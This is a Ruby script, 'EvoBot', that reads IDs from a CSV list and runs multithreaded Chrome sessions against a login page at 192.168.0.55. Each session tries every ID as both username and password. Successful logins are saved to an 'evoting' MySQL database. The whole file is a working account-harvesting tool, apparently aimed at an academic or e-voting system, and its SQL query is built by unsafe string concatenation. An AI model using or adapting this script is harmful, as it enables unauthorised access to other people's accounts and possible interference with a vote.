require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

require 'csv'

class EvoBot
    @id     
    @data     
    @browser     
    @client
    def initialize( params = {} )
        @client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
        @data = params.fetch(:data, [] ) 
        @id = params.fetch(:id, 0 ) 
        @baseUrl = "http://192.168.0.55/"
        puts( "Bot id : "+ "#{@id}" )


    end
    def get_id(  )
        return @id
    end
    def get_data(  )
        return @data[0]
    end
    def do_scanning(  )
        puts( "Bot id : "+ "#{@id}" + " do scanning" )

        @browser = Watir::Browser.new :chrome
        @data.each do |row|
            puts( "Bot id : "+ "#{@id}" + " | target : " + row[0] )
            nim = row[0]
            pass = row[0]
            @browser.goto @baseUrl + "/index.php?exec=login"
            @browser.text_field(:name => "NIP").set nim
            @browser.text_field(:name => "password").set pass
            @browser.input(:type => "submit" ).click 
        
            sleep(1)    
            if @browser.table(:class => "main" ).exists?
                query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
                puts( query )
                
                @client.query(query)
                @browser.link(:href => "ademik.php?logout=1" ).click
            end
            sleep(2)
        end
    end
end


# client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
# @baseUrl = "http://192.168.0.55/"

table = CSV.read("DPS PERTANIAN.csv")
puts( table.length )

bots = []
i = 0
start = 0
inc = 500
begin
    data = table[start .. ( start + inc ) ]
    bots.push(
        EvoBot.new( 
            :id => i,
            :data => data
        )
    )
    puts( "start " + "#{start}" )
    puts( "data[start] " + "#{data[0]}" )
    puts( "data.length " + "#{data.length}" )
    puts( "BLOCK" )
    
    i += 1
    start = start + inc
end until start > table.length
# end until i > 2

# puts( bots[0].get_id(  ) )
# puts( bots[0].get_data(  ) )

# puts( bots[1].get_id(  ) )
# puts( bots[1].get_data(  ) )

# puts( bots[1] === bots[0] )

bots.each do |bot|
    puts( bot.get_id(  ) )
    puts( bot.get_data(  ) )

    Thread.new{
        bot.do_scanning(  )
    }

end
sleep(500)
